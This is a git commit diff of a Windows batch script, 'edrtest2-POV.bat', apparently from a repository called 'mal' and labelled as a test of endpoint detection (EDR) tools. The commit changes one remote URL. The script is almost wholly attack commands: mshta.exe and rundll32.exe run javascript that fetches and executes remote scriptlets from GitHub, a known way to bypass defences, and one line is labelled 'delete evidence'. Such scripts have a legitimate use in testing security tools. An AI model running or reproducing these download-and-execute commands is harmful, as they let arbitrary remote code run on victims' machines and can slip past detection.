e4f3a04a0957a3f2abfa9274f777a8ef8516ad81
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-06-28 16:31:34 +0900

    Update edrtest2-POV.bat

--- edrtest2-POV.bat
+++ edrtest2-POV.bat
@@ -2,4 +2,4 @@ echo EDR test powershell activity
 mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2-POV")).Exec();close()
 timeout 5
 echo EDR test delete evidence
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3")
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3-POV")
